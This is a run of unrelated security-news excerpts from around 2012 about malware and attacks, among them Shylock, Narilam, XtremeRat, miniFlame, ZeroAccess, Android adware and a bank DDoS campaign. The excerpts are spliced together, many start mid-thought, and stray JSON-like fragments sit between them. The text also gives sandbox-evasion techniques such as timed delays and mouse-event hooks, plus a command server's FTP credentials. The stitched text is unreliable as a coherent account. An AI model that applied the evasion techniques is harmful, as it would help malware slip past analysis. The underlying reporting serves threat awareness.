Shylock named after the ruthless money lender in Shakespeare's The Merchant of Venice, also deletes its installation files, runs solely in memory, and begins the process again once the infected machine reboots.Shylock has gained a new trick: The ability to detect whether it's running in a virtual machine (VM) that is being analyzed by malware researchers.

It uses this return code to differentiate between normal desktops and other \"lab\" environments. In particular, when executed from a remote desktop session the return code will be different and Shylock won't install. It is possible to use this method to identify other known or proprietary virtual/sandbox environments as well.

Typically, one of the largest challenges for malware coders are to target multiple platforms. A malware for Android will not work in Windows phone, Symbian or Apple iOS, which come in way of malware coders. Also, devices such as iPhone are extremely secure and there is little that can be extracted from a locked / secure iPhone, unless they are jailbroken. Atul Alex's research abuses voice dialing feature which is enabled by default on all mobile platforms - and combines a bugged headset with a micro controller and code to steal private data. The bugged headset can also dial a pre-defined number by detecting if the device is in use or not and turn the phone into a spy device. Further, it can steal contacts from all devices - Blackberry, iphone, Symbian, Windows and Android, without putting a malware inside the mobile phone. The bugged headset can in fact mimic voice commands and send it to the device discretely - and Alex mentioned that advanced software like SIRI can infact aid hackers in future in sending unauthorized text messages as well as extract personal data and device information. Any mobile device running Google Android, Microsoft Windows Phone, Apple IOS 5, or Blackberry OS provides voice command capabilities. Some of the other possible things include knowing call duration and even record incoming and outgoing calls of users. And all this is possible just by plugging a bugged headset into the Audio jack. This has long term future implications and provides a grim future with electronics warfare. Malwares can now target people across all platforms, irrespective of 0-days in browsers, OS etc present or not.. and the last thing one would suspect is a gifted headset or speaker dock for your device." }

Malware Dubbed W32.Narilam, is predominantly active in the Middle East, and it has also been detected in the USA and UK. The worm looks for particular words in Microsoft SQL databases and overwrites them. The worm specifically targets SQL databases with three distinct names, alim, maliran, and shahd. Once the targeted databases are found, Narilam looks for specific objects and tables and either deletes the tables or replaces items with random values. On Monday an alert was published on tarrahsystem.com warning of the W32.Narilam threat to its customers. The bulk of the infections thus far have been found in the Middle East, particularly Iran and Afghanistan. Kaspersky Lab took issue with reports based on Symantec’s claim that Narilam was built using Delphi. “We’ve analysed the sample and found no obvious connection with these. Duqu, Stuxnet, Flame and Gauss have all been compiled with versions of Microsoft Visual C, while Narilam was built with Borland C++ Builder 6 (and not Delphi, as other articles seem to suggest), a completely different programming tool.” Iran’s Computer Emergency Response Team issued a statement calling Narilam unsophisticated and “has no sign of a major threat.” In fact, Iran’s CERT said it had been previously detected in 2010 and targets accounting software developed by an Iranian company used by small businesses." }

The attackers were serving up the XtremeRat trojan, which was infamously used in surveillance campaigns against Syrian activists. XtremeRat trojan a Remote Access Trojan that can be used to steal information and receive commands from a remote attacker. According to Trend, the latest iterations of Xtreme Rat have Windows 8 compatibility, improved Chrome and Firefox password grabbing, and improved audio and desktop capture capabilities features. Looking into the source of the attacks, Norman said “What is behind these IP addresses is hard to establish. It is possible they are hacked boxes and as such do not give much valid information. If that were the case, one might have expected a greater IP range and geographical distribution, but nothing is certain,”. \"In the following investigation we first found several other trojans similarly signed, then many more trojans connecting to the same command & control structure as the first batch.\". \"The Command & Control structure is centered around a few dynamic DNS (DynDNS) domains that at the time of writing point to hosting services in the US.\" Officials have yet to determine whether the virus is a prank or was generated by Iran's cyberwarfare program, which had been rapidly expanded since Tehran's nuclear program was hit by the Stuxnet virus in 2010." }

The research firm Gartner indicates that by 2016 the increase in Windows Phone users will slightly fall below Apple`s iOS users. To be showcased at the International Malware Conference, MalCon - on 24th November in India, the prototype has been created by Shantanu Gawde, who has previously created a malware that utilized the famed Xbox Kinect. Windows Phone 8 replaces its previously Windows CE-based architecture with one based on the Windows NT kernel with many components shared with Windows 8, allowing applications to be easily ported between the two platforms. While no further details of the malware are available at this point of time, it will be only time before attackers target the platform aggressively to invade users privacy. The research also stresses on that fact that enterprise adoption of mobile security solutions must be taken very seriously as it may have significant impact on business.

The activities observed are much suspected, they portend that there is an ongoing attack for cyber espionage or a massive information theft operation by cyber crime . This could be just a first stages of the attacks in which information are collected for further and complex initiatives. The stolen image files could be used for blackmailing the victims and demanding a ransom, it’s nor first time, let’s reminds what happened some months ago when nude pictures of celebrities were stolen. This is not the unique use that I could suppose, images could be also used for other purposes, they could be related to reserved project or to document scans, their exposure could cause serious risks. Let’s think also to the possibility to use the images to create fake accounts to infiltrate social networks and gather information on specific targets rather than realize more sophisticated fraud schema Similar social engineering attacks have also hit high officials of government agencies in the past. There is also another disturbing particular … why the attackers are collecting also .dmp files?It is very likely that the attackers are interested to discover vulnerabilities in infected machines; the memory dump could contain useful information on programs in execution of the victim pc, data that could be used to adopt specific exploits in the attacks. “They are often created when a program has an error in coding and crashes. Gathering .dmp files could by a typo by the malware authors, who might have sought .bmp image files instead.” The file stolen are sent by the Trojan via FTP to the server with IP address 176.x.xxx.90 using following FTP credentials • Username=“wasitnew” • password=“qiw2e3r4t5y6.”The FTP doesn't respond since November 5th, maybe the authors are working to improve it or simply are rearranging the offensive. The post is closed with a mention to previous more sophisticated malware and the way the authors controlled them, for example hiding, using steganography methods, the command strings inside images sent to the agents. “Since 2008 we have seen image files carrying embedded image files within.

Most important Security Improvements in Android 4.2 is that it now includes a service based on Bouncer that works with all apps, not just those on Google Play. For example, it can check the apps you download on the Amazon App Store, or from 3rd Party sites. Whenever user will install any app from a different source than the official market, and will scan it for any malicious code that may prove potentially harmful for your device. Other than this, Users can now control how much data apps can access and share. This is made even more secure by something called VPN lockdown that can limit the amount of information sent over a connection that may not be secure or that is shared rather than private. Another feature included is an SMS confirmation feature that alerts users to text messages sent from their devices that they may not have written or sent. If your phone is discovered one of these, it will stop the service and then let you decide if you want to allow the action to happen or not. The app permissions screen has received a makeover, and is now providing more relevant information, along with being easier to read. Security Enhanced (SE) Linux, Android now has native support for “Security Enhanced” Linux. SELinux brings low-level improvements to Android’s Linux kernel such as: mitigation for privilege escalation attacks and stricter enforcement of least useable/application privilege. Some other new features in Android 4.2 include gesture-based typing, Photo Sphere camera and multi-user option, allowing different people to log on to the same device much like multiple user accounts on your laptop or desktop. I will demonstrate an Advance Android malware at Malcon Conference 2012 (an international malware conference) that can be configured online through a website and have 100's of features to control an Android device remotely even from a black & white mobile.

If malware stops itself when it detects that it is running in a virtual environment, it may trick an automated threat analysis system into thinking that it is a clean program. So malware may not only fool automated threat analysis systems, but also a corporate system administrator who is searching for computers compromised by malware. Malware authors have recently attempted to use other approaches to fool automated threat analysis systems as well. Latest example of such Trojan is that , where malware attaches its malicious code to routines normally used only to control the inputs from mouse clicks. The malicious code is designed to remain inactive unless the mouse itself is in use, giving a fair chance that the RAT will remain undetected, in the never ending cat and mouse game these two parties play. Technically, this malware variant uses the SetWindowsHookExA Windows API function to inject itself into the message handling functions that process mouse events. When the code runs, it waits 300,000 milliseconds, or five minutes, before executing the DecryptCode subroutine, as shown in the image above. It then waits 20 minutes and executes the ModifyRegistry subroutine After executing the Network_main subroutine, it waits another 20 minutes. Automated threat analysis systems only spend a small amount of time on one file so they may not detect the code as malware.

Then the dropper will execute the main module before removing itself from the computer. Because some string of characters used to process encrypted communication with the creator is in Japanese, Symantec believe the creator is most likely a person who has a good understanding of the Japanese language. Symantec has also acquired a third variant of this threat. The version number of this variant is 2.0. It is practically identical to version 2.23 and there are no noticeable differences between the two. Police are currently investigating the connection between the threats and the malware. The structure and functions of Backdoor.Rabasheeta are not advanced compared to modern malware. However, it is still capable of surreptitiously opening a back door on a compromised computer. To protect against this type of threat, users should use caution when downloading software from unknown sources. Do not click on suspicious links or attachments in emails." }

What else but the most exciting part downloading the right apps to boost its functionality. Android gives you the freedom to personalize your device, which has made it attractive to those who want their smartphones to be as unique as possible \"Many apps will ask you to grant them network access so they can download updates. Others seek permission to read your phone’s state and identity so calls won't disrupt them from doing what they're doing. Unfortunately, these permissions can be abused for criminal intentions.\" Trendmicro said in report. Before android applications was abusing permissions to access user's personal data, but now new generations of adware targeting Android smartphones are increasingly violating user privacy by grabbing personal information and using it without permission. Adware is software that is used to gather information about the users. This information is sent to advertising agencies who are the people who planted the adware in the first place. Adware displays an advertisement in the form of pop ups or text messages. When you click on the advertisement, you will be redirected to a browser that will open the link to the advertisers’ site. When you visit the site, your data will be logged into the advertisers’ server. We have no way of ensuring that adware is within its legal limitations while collecting data about you. The procedure is very simple. Although most adware is designed to collect some user information, the line between legitimate data gathering and violating privacy is starting to blur. The process becomes a privacy issue when app developers take more information than they originally asked for and then sell it to ad networks. Here is a list of the data leaked from the Android device and sent to the servers of the company behind this module: The device’s IP address on all interfaces (i.e., both WiFi and mobile network) The device’s ANDROID_ID (unique 64-bit identifier for the device) The Android OS version The user’s location, as determined by GPS The user’s mobile network and their country code The user’s phone number The device’s unique ID (their IMEI, MEID, or ESN) The device’s manufacturer and version Based on information from MARS and Google Play, at least 7,000 free apps use this particular advertising module. 80% of them are still available, and at least 10% of them have been downloaded more than one million times. In addition to taking the user’s personal information, these ads also display advertising in particularly annoying ways. Either notifications or an icon on the device’s home screen are used to serve ads to users. Users should be careful about all mobile apps they download, wherever they come from." }

The report is based on data from the Global Intelligence Network, which Symantec's analysts use to identify, analyze, and provide commentary on emerging trends in attacks, malicious code activity, phishing, and spam. Here are some highlights from the threat landscape of 2011. \"It is impossible to manually analyze such a large number of sample files, so it is therefore necessary to use an automated threat analysis system to analyze sample behavior and prioritize the files that virus definitions should be created for.\" Symantec said in a blog post. Political activism and hacking were two big themes in 2011 themes that are continuing into 2012. There were many attacks last year that received lots of media attention. Hacking can undermine institutional confidence in a company, and loss of personal data can result in damage to an organization’s reputation. Also, Many companies are keen to adopt cloud computing. It can reduce costs by outsourcing routine services. The first risk is unmanaged employee use of cloud services. The proportion of phishing emails varied considerably by company size with the smallest and largest companies attracting the most, but the proportion of spam was almost identical for all sizes of business. The United States was the number one source of all activities, except for malicious code and spam zombies, where India took first place. Around 12.6% of bot activity originated in the USA as did 33.5% of web-based attacks, 16.7 % of network attacks and 48.5% of phishing websites. Get complete report here." }

The attack objectives therefore typically extend beyond immediate financial gain, and compromised systems continue to be of service even after key systems have been breached and initial goals reached. Today’s successful targeted attacks use a combination of social engineering, malware, and backdoor activities. Nart Villeneuve and James Bennett (Senior Threat Researcher) from Trend Mirco provide an ultimate guide for Detecting (APT) Advanced Persistent Threat activities with Network Traffic Analysis, that can be used to identify malware command-and control (C&C) communications related to these attacks, illustrating how even the most high-profile and successful attacks of the past few years could have been discovered. Paper cover Detecting Remote Access Trojans like The GhostNet, Nitro attack, RSA Breach, Taidoor campaign, Sykipot campaign and more. Nart also talk about the Challenges during Network-Based Detection i.e Two key factors pose challenges to network-based detection encryption and the cloud. More than 90% of intrusions aren't even discovered by the victims themselves, but through third-party notification. In many cases, the APT has been on the victim network for months or even years, exfiltrating intellectual property data plus economic and political information. \"The ability to detect APT activity at the network level is heavily dependent on leveraging threat intelligence. A variety of very successful ongoing campaigns can be detected at the network level because their communications remain consistent over time.\" To get rid of such attacks you much know that what that information is, where it resides, who has access to it, why they have access and when they access it. Answering these types of questions should give you a clearer picture of what are the most critical pieces in your infrastructure that need your attention. Modifications made to malware’s network communications can, however, disrupt the ability to detect them. As such, the ongoing development of threat intelligence based on increased visibility and information sharing is critical to developing indicators used to detect such activity at the network level.

The number of high risk and dangerous apps targeting Android users jumped from 30,000 in June to 175,000 in September, Trend Micro said in its third quarter security roundup. While some apps are clearly criminal - such as those that secretly purchase premium smartphone services - others are more of a privacy threat. These include \"Aggressive Adware\" apps that collect more personal information than the user has authorized. App developers may even be aware of the problem, thanks to the existence of rogue ad networks. \"Though most adware is designed to collect user information, a fine line exists between collecting data for simple advertising use and violating one's privacy,\" Trend Micro said. \"Because adware normally collect user information for legitimate purposes, they can serve as an effective means to gather more data than some would want to give out.\" Many of these issues are less of a problem in the United States and more worrisome in other countries, such as China and Russia. In those countries, users commonly use third-party app stores, which have much more lax standards of security. A previous review of mobile threats by security firm Lookout estimated that more than 40 percent of the devices in Russia are infected by malicious software. Trend Micro noted that fake versions of legitimate Android apps are the most prevalent type of Android malware. This quarter, data-stealers like Solar Charge and premium service abusers like Live Wallpapers in China or fake versions of best-selling apps that spread in Russia further raised concerns about the open nature of the Android ecosystem. Researchers with Trend found evidence that a series of attacks linked to Chinese hackers that focused on Indian and Japanese military agencies, as well as Tibetan human-rights groups, may include component for infecting Android devices in the future. The Android apps were under development and could steal information as well as install additional components on the phone. Trend Micro also examined threat landscape for non-mobile endpoints." }

This new nation-state espionage malware that has ties to two previous espionage tools known as Flame and Gauss, and that appears to be a “high-precision, surgical attack tool” targeting victims in Lebanon, Iran and elsewhere. miniFlame, also known as SPE, was found by Kaspersky Lab’s experts in July 2012, and was originally identified as a Flame module. But originally MiniFlame seems to be used to gain control of and obtain increased spying capability over select computers originally infected by the Flame and Gauss spyware. According to Kaspersky, versions of miniFlame were created in 2010 and 2011, and some of the six variants are still considered active. It is expected that development of the malicious program could have started as far back as 2007. \"MiniFlame is a high precision attack tool,\" said Alexander Gostev, Chief Security Expert, Kaspersky Lab, describing the malware. \"Most likely it is a targeted cyber weapon used in what can be defined as the second wave of a cyberattack.\" Main results of miniFlame analyses: miniFlame aka SPE, based on the same architectural platform as Flame. It can run as a standalone program or cyber espionage as an internal component of Flame and Gauss. The tool of cyber operates via a backdoor (\"backdoor\") designed to steal data and give direct access to infected systems. Development miniFlame could have started as early as 2007 and continued until the end of 2011. Many variants appear to have been created. Today, Kaspersky Lab has identified six key corresponding to two generations 4.x and 5.x. Unlike Flame or Gauss, responsible for a large number of infections, due to the miniFlame is much lower. According to the data from Kaspersky Lab, it would be limited to 10 or 20 machines. The total number of infections globally is estimated at 50 or 60. The small number of infections combined with flight capabilities miniFlame information and the flexibility of its design indicates that it has been used for highly targeted cyber espionage operations and has most likely been deployed in machines already infected with Flame or Gauss.

Defence Secretary Leon Panetta said the cyberthreat from Iran has grown, and declared that the Pentagon is prepared to take action if America is threatened by a computer-based assault. The hackers are apparently part of a group of less than 100 computer security specialists from Iranian universities and network security firms, according to an unnamed US government official. American officials have said they are able to discover the source of the recent cyberattacks. We do welcome this and announce our readiness for any international cooperation to find the source of the attacks. The Iranian official said Tehran has already offered help to boost the companies cybersecurity, as Iran has itself recently been the victim of cyberattacks on its offshore oil platforms. The cyberattacks hit the Saudi Arabian state oil company Aramco and Qatari natural gas producer RasGas using a virus, known as Shamoon, which can spread through networked computers and ultimately wipes out files by overwriting them. Iran blames Israel and the United States for the attacks.

The latest threat to Android phone users, according to the FBI, is a “work-at-home opportunity that promises a profitable payday just for sending out email.” The IC3 has been made aware of various malware attacking Android operating systems for mobile devices. Some of the latest known versions of this type of malware are Loozfon and FinFisher. Loozfon is an information-stealing piece of malware. Criminals use different variants to lure the victims. One version is a work-at-home opportunity that promises a profitable payday just for sending out email. A link within these advertisements leads to a website that is designed to push Loozfon on the user’s device. The malicious application steals contact details from the user’s address book and the infected device’s phone number. FinFisher is a spyware capable of taking over the components of a mobile device. When installed the mobile device can be remotely controlled and monitored no matter where the Target is located. FinFisher can be easily transmitted to a Smartphone when the user visits a specific web link or opens a text message masquerading as a system update. Last week, security experts at McAfee announced that more than 60% of Android malware uses fake premium SMS messages. In their post on this subject, McAfee said, “Malware authors appear to make lots of money with this type of fraud, so they are determined to continue improving their infrastructure, code, and techniques to try to avoid antivirus software. It’s an ongoing struggle, but we are constantly working to keep up with their advances.” Safety tips from FBI to protect your mobile device: When purchasing a Smartphone, know the features of the device, including the default settings. Turn off features of the device not needed to minimize the attack surface of the device. Depending on the type of phone, the operating system may have encryption available. This can be used to protect the user’s personal data in the case of loss or theft. With the growth of the application market for mobile devices, users should look at the reviews of the developer/company who published the application. Review and understand the permissions you are giving when you download applications. Passcode protect your mobile device. This is the first layer of physical security to protect the contents of the device. In conjunction with the passcode, enable the screen lock feature after a few minutes of inactivity. Obtain malware protection for your mobile device. Look for applications that specialize in antivirus or file integrity that helps protect your device from rogue applications and malware. Be aware of applications that enable Geo-location. The application will track the user’s location anywhere. This application can be used for marketing, but can be used by malicious actors raising concerns of assisting a possible stalker and/or burglaries. Jailbreak or rooting is used to remove certain restrictions imposed by the device manufacturer or cell phone carrier. This allows the user nearly unregulated control over what programs can be installed and how the device can be used. However, this procedure often involves exploiting significant security vulnerabilities and increases the attack surface of the device. Anytime a user, application or service runs in “unrestricted” or “system” level within an operation system, it allows any compromise to take full control of the device. Do not allow your device to connect to unknown wireless networks. These networks could be rogue access points that capture information passed between your device and a legitimate server. If you decide to sell your device or trade it in, make sure you wipe the device (reset it to factory default) to avoid leaving personal data on the device. Smartphones require updates to run applications and firmware. If users neglect this it increases the risk of having their device hacked or compromised. Avoid clicking on or otherwise downloading software or links from unknown sources. Use the same precautions on your mobile phone as you would on your computer when using the Internet.

A new version of the Play Store app has been released and it is starting to roll out to Android owners. Google Play Store 3.9.16 includes the ability to remove apps from the All Apps list. There is a module called \"App Check\" that will allow Google to inspect every app you've already downloaded, and a doorman-style app blocker that will warn you if an app is suspicious. Devices without Google Play installed (and there are plenty, especially in Asia and China) still won’t be protected. Google's Bouncer was a server-side Play Store malware cop, but this sounds like a new, client-side initiative, possibly the result of their recent acquisition of VirusTotal. In the past we've seen fake versions of Instagram, Angry Birds and many more popular Android apps distributed via non-official channels with the intention of infecting Android phones and tablets. Other features of the version 3.9.16 of the Play Store include: Location tracking in lists: When you select an app from a list and return to the list, your location on the list is retained. No more scrolling you back to the beginning. New notifications: The new updates notification now gives you more information on which apps have available updates. Instead of simply stating that x amount of updates are available, you will now get the names of some of the apps that have updates available. In addition, the detailed notifications, the icons for update notifications have also been updated. When an app is updated, gone is the generic updated notification icon. You will now see an actual icon of the app that has been updated. Google has yet to push the update, but if you want to try it out now, Android Police is offering the APK for download. The APK is signed by Google, which gives us assurance of its authenticity and security. Subscribe to our Daily News-letter via email - Be First to know about Security and Hackers." }

These pigs can indeed fly - \"Bad Piggies,\" the spinoff to the monster hit game \"Angry Birds,\" set a new record by soaring to the top of the charts just three hours after release. Scammers have quickly taken advantage of this, introducing bogus versions of Bad Piggies into the Chrome Web Store that exist primarily to serve up in-browser advertisements thanks to a few plug-in permissions. Barracuda Networks’ lab today discovered a knock-off of the new and wildly popular “Bad Piggies” game which includes a phishing plug-in that may have injected an aggressive adware program into more than 82,000 Chrome browsers. The lack of a free online version for Bad Piggies left space for others to capitalize on the instant success of the game. Just days after the game launched, Jason Ding, a research scientist from Barracuda Networks, found seven free versions of the games in the Google Chrome web store. Jason Ding notes that all of these games are being distributed by the same site: playook.info. After installation, the games insert their own advertisements into popular websites. Barracuda found that after deploying the games in a test environment, they inserted advertising from playook.com into sites like Myspace, eBay, IMDB, Yahoo and MSN among dozens of other sites on the Chrome browser. \"If you have already installed, uninstall them immediately and change your passwords on other websites if possible,\" Barracuda said. The firm also warned users to be wary of plugins that requires a lot of suspicious permissions." }

These warnings are not being shown because Google’s internal systems have been compromised or because of a particular attack. \"The company said that since it started alerting users to malicious probably state-sponsored activity on their computers in June, it has picked up thousands more instances of cyberattacks than it anticipated.\" NYtimes said. Google will now start sending out these messages to tens of thousands more people, as its methods for detecting suspicious activity have improved. Mike Wiacek, a manager on Google’s information security team, said that since then, Google has improved its knowledge on attack methods and the groups behind them, and has started pushing out new alerts on Tuesday - as evidenced by a slew of U.S. journalists, researchers and foreign policy experts who said they already received the warning. Noah Schactman, the editor of Wired’s national security blog “Danger Room,” tweeted: “Aaaaand I just got Google’s ‘you may be a victim of a state-sponsored attack’ notice. #WhatTookYouSoLong?” Mr. Wiacek noted that Google had seen an increase in state-sponsored activity coming from the Middle East. He declined to call out particular countries, but he said the activity was coming from “a slew of different countries” in the region." }

Botnet infections are commonly spread though compromised websites seeded with malicious scripts and promoted via black hat SEO tactics such as link farms. These malware networks, or malnets, pose a growing threat, The company said the number of malnets now stands at more than 1,500, an increase of 300% in the past six months, and it expects they will be, \"responsible for two-thirds of all malicious cyberattacks in 2012.\" According to Blue Coat, the largest known malnet is Shnakule, which has used up to 5,005 malicious hosts or servers at any given time, depending on the capabilities needed at any given moment by its operators. Blue Coat believes that Shnakule is controlled by a single gang, and it's been used to serve up just about every type of known attack, including \"fake AV attack, fake code, fake Firefox updates, C&C servers, gambling, work at home stuff, porn,\" said Van Der Horst. \"They've got their fingers in every evil pie out there.\" \"Then the user's computer is infected with a Trojan,\" the report said. \"Once the computer is compromised it can be used by the botnet to lure new users into the malnet by using the infected machine to send spam to email contact lists, for example.\" \"A compromised system can also be used to steal the victim's personal information or money, and, in some cases, can also function as a jumping-off point for attacks on neighboring machines,\" the report said. \"When security companies aggressively pursued the Zeus botnet, malnet operators simply shifted their resources to the Aleuron botnet, developing and using it in attacks,\" said Blue Coat's researchers. Interestingly, the rise of malnets has also had some unexpected effects, the company claims. In August, Blue Coat reported that simple 'long tail' web searches were still far more important for serving malware than special events such as the London Olympics or breaking news." }

According to the malware analyst at Kaspersky Lab in Brazil, Fabio Assolini. The vulnerability exploited by attackers allowed the use of a script to steal passwords and remotely access the configuration of modems. The attacks was described as \"One firmware vulnerability, two malicious scripts, three hardware manufacturers, 35 malicious DNS servers, thousands of compromised ADSL modems, millions of victims.\" According to Kaspersky, the Brazilian attackers sought to steal users' banking credentials by redirecting users to false versions of popular sites like Facebook or Google and prompting them to install malware. Some 40 DNS servers were set up outside Brazil too in order to serve forged requests for domain names belonging to Brazilian banks. Nakedsecurity writes,-- The first thing users may have noticed is that they would visit legitimate websites such as Google, Facebook and Orkut (a Google social network which is particularly popular in Brazil) and would be prompted to install software. In the example below, visitors to Google.com.br were invited to install a program called \"Google Defence\" in order to access the \"new Google\". It remains unclear which modem manufacturers and models are susceptible to the attacks. Assolini said a vulnerability disclosed in early 2011 appears to be caused by a chipset driver included with modems that use hardware from communications chip provider Broadcom. It allows a CSRF attack to take control of the administration panel and capture the password set on vulnerable devices. After manufacturers issued firmware updates to plug the security hole, the number of compromised modems reduced. However, some 300,000 modems are still thought to be controlled by attackers." }

The banks suffered denial-of-service attacks, in which hackers barrage a website with traffic until it is overwhelmed and shuts down. Such attacks, while a nuisance, are not technically sophisticated and do not affect a company’s computer network or, in this case, funds or customer bank accounts. Hacktivists, calling themselves \"Mrt. Izz ad-Din alQasssam Cyber Fighters,\" attacked Wells Fargo and posted on Pastebin that U.S. Bancorp and PNC Financial Services Group are next. The group said it had attacked the banks in retaliation for an anti-Islam video that mocks the Prophet Muhammad. It also pledged to continue to attack American credit and financial institutions daily, and possibly institutions in France, Israel and Britain, until the video is taken offline. The New York Stock Exchange and Nasdaq were also targeted. Frustrated customers of Bank of America, JPMorgan Chase, Citigroup, U.S. Bank, Wells Fargo and PNC, who could not get access to their accounts or pay bills online, were upset because the banks had not explained clearly what was going on. Representatives for other banks also confirmed that they had experienced slow Internet performance and intermittent downtime because of an unusually high volume of traffic. Security researchers said the attack methods were too basic to have taken so many US bank sites offline. The hackers appeared to be enlisting volunteers for the attacks with messages on various sites. IT Security professionals need to realize that the hackers are doing damage to websites without having to access the corporate servers. They are hitting the site hard without breaking in. A safety barrier must be created and maintained. Update: Prolexic Technologies said the distributed denial of service (DDoS) toolkit called itsoknoproblembro was used against some of the banks which included Wells Fargo, U.S. Bank, PNC Bank, Bank of America and JPMorgan Chase. The attack signatures are extremely complex and Prolexic has recorded sustained floods peaking at 70 Gbps and more than 30 million pps against some of its customers. Most mitigation providers would struggle to combat DDoS attacks with these characteristics. The itsoknoproblembro toolkit includes multiple infrastructure and application-layer attack vectors, such as SYN floods, that can simultaneously attack multiple destination ports and targets, as well as ICMP, UDP and SSL encrypted attack types." }

According to the MIT Technology Review, researchers at Indiana University and the Naval Surface Warfare Center have developed a new form of malware designed to record and reconstruct a victim's environment. They has just worked out how to infect a mobile phone with a Trojan that can take photos without you knowing anything about it and send sensor data back to a server. The data are used to construct a 3D model which can be used not only to perform the reconnaissance necessary to break in, but also to steal confidential information such as bank details. On the original page presenting an explanation of the app, the authors note that their work demonstrated “the effectiveness of using mobile devices as powerful surveillance and virtual theft platforms.” The software even shuts off the phone’s speaker so someone being spied on doesn’t hear the typical sound a device emits when a photo is taken. The developers do say that one way to protect yourself against virtual theft apps such as this is by ensuring that you always have antivirus software and that your shutter audio is always on." }

The FixMeStick is, in short, a malware removal device for dummies. The FixMeStick is a bootable USB device running Lubuntu and integrates three separate anti-virus scanners from Kaspersky Labs, Sophos, and GFI. While our readers will probably never need it for themselves, we may all wish we had something like this for our non-technical friends and family, or the 9 million PCs infected with ZeroAccess botnet. The FixMeStick does a lot of things that nobody else does on a bootable USB, and let’s be real, removing rootkits is never pleasant or easy. Why I Want it For My ParentsLinux: the FixMeStick is a Linux-based device that runs before Windows boots enabling it to remove infections without the infection getting stealthy or playing war with my parent’s anti-virus software. N-Scanner architecture: contains an integrated multi-scanner composed of three engines: Kaspersky Labs, Sophos, and GFI’s VIPRE. Full screen app: all the technology is integrated behind a single full-screen application, my parents never see Linux, or any of the three anti-virus engines. Typical Linux shortcut keys still work, but there’s no risk of my mother wandering off into vi. It’s the easiest thing to use: right out of the box my parents just plug it into a USB port and double-click \"Run FixMeStick\". There’s no software to install. The FixMeStick does this clever little hack with the Windows boot manager getting Windows to boot the FixMeStick one time. This means my parents don’t have to futz with the BIOS, but you still can if you want to. WiFi: supports wireless adapters and automatically finds my parents SSID and password from the Windows side and sets up the connection. My parents do nothing. I get no phone call from them. Automatic updates are fetched and stored directly on the FixMeStick. It boots on everything: the boot-loader is setup such that it can support different boot configurations without my parents having to do anything. BIOS compatibility has been a killer to Live USBs, but we’ve not found a PC the FixMeStick will not boot on, including the fancy VAIOs that ship with a Boot From External Device setting off by default. Out-of-band-management: this is quite cool, there’s a remote connection client built into the FixMeStick, so if my parents need support, the FixMeStick engineers can connect directly to the device without my parents having to do anything other than provide the randomly generated userid and password generated by the app. What’s Not Good:Out-of-band-management! A bad actor could call my parents and tell them to plug in the FixMeStick and get the userid\\password. Of course, such a social engineering attack is possible whether there’s a FixMeStick in the house or not. Denial of Service: Malware can deny access to the FixMeStick by smoking the MBR or the Linux files. There are a few ways to fix this, and you probably know what they are, and we expect to see one implemented in the next major version of the FixMeStick. 50% Discounts for The Hacker News readers:Overall, we like this product. It’s practical and well built. And while the digital futurists may be calling the end of the PC, the next massive botnet is not likely to run on iOS or Android. The FixMeStick provides a practical means for non-technical people to clean their own PCs. Other, back of the box type information:$49.99, with free shipping to anywhere in the world.

Four active exploits of a zero-day vulnerability in the browser exists. Microsoft will push out an out-of-cycle Windows patch to temporarily fix the critical Internet Explorer flaw. Security researcher Eric Romang identified the exploit code on a server used by the \"Nitro\" hacking group, believed to have exploited the Java zero-day vulnerability reported last month. Security firm Rapid7 advises that Internet users try a different Web browser. The malware may be linked to an ongoing attack on companies that has been dubbed “Nitro”, and was first discovered in October by Symantec. The zero-day in IE 6-9 is a use-after-free memory corruption vulnerability, similar to a buffer overflow, that would enable an attacker to remotely execute code on a compromised machine. The original exploit payload dropped the PoisonIvy remote access Trojan (RAT) via a corrupted Flash movie file. The latest payload discovered dropped the PlugX RAT via the same corrupted Flash movie. This type of attack is typically begun with a phishing email, or by tricking users into clicking links in social media. The security advisory notes that mainstream websites that have ads placed on the site via third-party ad servers could also be vulnerable if the ad servers are compromised. In other words, any site could be used to take advantage of the IE flaw.It’s a serious flaw. Even, The German government has started telling its citizens to switch to other browsers. Microsoft has reported that most users are not affected by the bug, and the number of attacks has been limited. In the company's update about the bug, they suggest either deactivating ActiveX controls or using their Enhanced Mitigation Experience Toolkit until a patch is released. Metasploit also Release PoC for this .\"This module exploits a vulnerability found in Microsoft Internet Explorer (MSIE).

Before, disclosed that it creates its own hidden partition on the hard drive and uses hidden alternative data streams to hide and thrive. Then ZeroAccess developer changed infection tactics and stopped using kernel-mode components in the latest version Security firms tracked the growth of x64 version infections. But Recently uncovered by SophosLabs that ZeroAccess botnet took a major shift in strategy and operating entirely in user-mode memory. There are two distinct ZeroAccess botnets, and each has a 32-bit version and a 64-bit version, numbering four botnets in total. Each botnet is self-contained because it communicates exclusively on a particular port number hard-coded into the bot executable. The botnets can be categorised based on their port numbers. Ports 16464 and 16465 are used by the 32-bit and 64-bit versions of one botnet; ports 16470 and 16471 are used by the 64-bit and 32-bit versions of the other botnet. They also disclose the ZeroAccess has been installed on computers over nine million times with the current number of active infected PCs numbering around one million. The current size of the botnet is somewhere in the region of 9 million machines spread throughout the world, but with the majority located in the U.S. Other than U.S other top infected countries are :Brazil Japan Romania Argentina Venezuela Chile The ZeroAccess botnet currently creates two primary revenue streams: click fraud and Bitcoin mining. Click fraud and Bitcoin mining can earn the botnet owners a potential $100,000 a day. \"The traffic generated by the ad-click fraud can burn through your bandwidth cap. We have been following a number of bots such as ZeroAccess whose primary function is ad-click fraud. These bots receive instructions from a controller directing them to click on ads on specific web sites. The web site owner gets paid by the advertiser on a per click basis usually through the intermediary of an ad network. The advertisers and ad network operator have a number of safeguards in place to protect against click fraud,\" the report said. The ZeroAccess botnet not only makes large amounts of money for its owners but it also causes significant damage and loss in a variety of ways to a variety of individuals and entities. Various aspects of ZeroAccess’ operation consume considerable bandwidth. This is 1,227,300 bytes per hour, 29,455,200 per day and 895,929,000 bytes per month. 895 MB per month per bot means a botnet with 1 million nodes could be producing as much as 895,000,000 MB or 895 Terabytes of network traffic per month. And all of this occurs before any files are actually downloaded using the protocol. The peer-to-peer protocol used by the latest version of ZeroAccess contains only a few commands and is designed to spread files and IP addresses across the network quickly. It is encrypted to avoid easy detection and there are a number of measures taken to avoid the network being poisoned or taken over. This generally held at around 150,000 new installations per day, with a noticeable drop at the end of August." }

